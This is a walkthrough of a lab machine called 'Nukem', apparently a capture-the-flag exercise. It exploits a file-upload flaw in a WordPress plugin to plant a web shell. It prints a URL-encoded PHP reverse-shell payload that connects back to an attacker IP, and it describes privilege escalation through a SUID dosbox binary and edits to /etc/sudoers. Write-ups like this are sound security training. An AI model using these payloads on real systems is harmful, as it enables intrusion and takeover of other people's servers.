Nukem

Target IP: 192.168.233.105

Hmmm… That’s gonna leave a mark.

Scanning


There are six TCP ports open on the target machine. From the aggressive nmap scan above, it looks like the port 80 contains a WordPress application. I will start enumeration with this application.

Enumeration

Port 80: HTTP

Browsing to this port displays the WordPress webpage above. The target machine is running WordPress 5.5.1 application. Performing a wpscan against this application shows there is a user called admin; however, I am unable to perform bruteforcing.


Running the command wpscan --url http://192.168.233.105/ --plugins-detection aggressive shows the simple-file-list 4.2.2 plugin above is vulnerable to file upload attack.

Exploitation


I downloaded the exploit php/webapps/48979.py on my local machine.


Then I made the change to the payload line of code. I changed the reverse shell connection to a simple web-shell I can access.


Then I ran the exploit against the target machine. It says the payload was successfully uploaded to http://192.168.233.105//wp-content/uploads/simple-file-list/ as 6244.php/


And now I am able to the simple web-shell, as shown above by the commands id;whoami;ps. Time to gain a reverse shell connection.


And now I have a reverse shell connection from the target machine. I used the PHP payload mentioned below. I have a foothold on the target machine now.
PHP payload used: php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.45.155%22%2C80%29%3B%60%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%60%3B%27
Full URL with PHP payload: 192.168.233.105//wp-content/uploads/simple-file-list/6244.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.45.155%22%2C80%29%3B%60%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%60%3B%27

Privilege Escalation


I found the MySQL username and password at wp-config.php file.


A user called commander exists. Using the password CommanderKeenVorticons1990 from the file above, I gained access to this user's account.


Gaining a root shell was super simple. Running find / -perm -u=s -type f 2>/dev/null shows the binary /usr/bin/dosbox. Then I ran the commands above in the picture highlighted in yellow to spawn a root shell. I tried to create a new root user and making change to /etc/passwd but this did not work. However, changing the /etc/sudoers worked. Now I have a root shell.
